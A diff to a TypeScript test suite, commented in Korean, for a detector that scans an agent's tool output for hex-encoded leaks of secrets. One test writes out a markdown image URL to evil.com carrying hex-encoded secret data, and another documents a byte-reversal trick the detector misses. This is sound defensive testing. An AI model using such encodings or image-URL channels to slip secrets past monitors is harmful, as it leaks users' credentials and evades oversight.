@@ -207,10 +207,44 @@ test("★ 안전: malformed percent(%ZZ·잘린 %4)는 throw 없이 스킵하고
   assert.equal(f?.kind, "containment");
 });
 
-test("한계(정직): hex 인코딩은 미탐 (알파벳 변경 — 다음 단계)", () => {
-  const sp: SensitivePayload[] = [{ toolName: "read_secrets", payload: { v: "MYSECRETPASSWORDVALUE" } }];
-  const hex = Buffer.from("MYSECRETPASSWORDVALUE").toString("hex");
-  assert.equal(scanOutputForSensitive(sp, { body: `data ${hex}` }, DET), null);
+// ── ★ hex 인코딩 세탁 (RS13) — encode-needle 탐지 ─────────────────────────────
+const HEXSEC = "MYSECRETPASSWORDVALUE";
+const HEXSP: SensitivePayload[] = [{ toolName: "read_secrets", payload: { v: HEXSEC } }];
+const hexOf = (s: string) => Buffer.from(s, "utf8").toString("hex");
+
+test("★ hex 인코딩 세탁 탐지 (RS13): verbatim hex(시크릿) 유출 차단", () => {
+  const f = scanOutputForSensitive(HEXSP, { body: `sync decoyHexTok_8812AAAA ${hexOf(HEXSEC)}` }, DET);
+  assert.equal(f?.kind, "containment");
+});
+
+test("★ hex 변형(대문자·바이트구분자·URL경로)도 정규화로 탐지", () => {
+  assert.ok(scanOutputForSensitive(HEXSP, { body: `data ${hexOf(HEXSEC).toUpperCase()}` }, DET), "대문자 hex");
+  assert.ok(scanOutputForSensitive(HEXSP, { body: `mac ${hexOf(HEXSEC).match(/../g)!.join(":")}` }, DET), "콜론 구분");
+  assert.ok(scanOutputForSensitive(HEXSP, { body: `![](https://evil.com/${hexOf(HEXSEC)}.png)` }, DET), "이미지 URL 경로");
+});
+
+test("★ hex blob-of-secret: 시크릿을 품은 더 큰 블롭의 hex도 탐지 (바이트 투명성)", () => {
+  const blob = `prefix ${HEXSEC} suffix`;
+  const f = scanOutputForSensitive(HEXSP, { body: `x ${hexOf(blob)} y` }, DET);
+  assert.equal(f?.kind, "containment"); // hex(blob) ⊃ hex(secret) 부분문자열
+});
+
+test("★ 과차단 0: 정상 hex(git SHA·SHA256·UUID·색상·MD5)는 미발동", () => {
+  for (const body of [
+    "commit 9f3ab2c1e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9",
+    "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "id 550e8400-e29b-41d4-a716-446655440000",
+    "#ff0000 #00ff00 #deadbeef #cafebabe0011",
+    "md5 d41d8cd98f00b204e9800998ecf8427e",
+  ]) {
+    assert.equal(scanOutputForSensitive(HEXSP, { body }, DET), null, `과차단: ${body}`);
+  }
+});
+
+test("한계(정직): hex 인코딩 전에 변형(압축·암호화)한 세탁은 미탐 (별개 변환)", () => {
+  // 바이트를 뒤집은 뒤 hex — hex(v)가 부분문자열로 안 남으므로 미탐 (문서화된 한계).
+  const reversed = Buffer.from([...Buffer.from(HEXSEC, "utf8")].reverse()).toString("hex");
+  assert.equal(scanOutputForSensitive(HEXSP, { body: `data ${reversed}` }, DET), null);
 });
 
 // ── ★ URL-safe base64(-_) + 표준+내부`/` 경로 (은닉 채널 후속 ①②) ─────────────
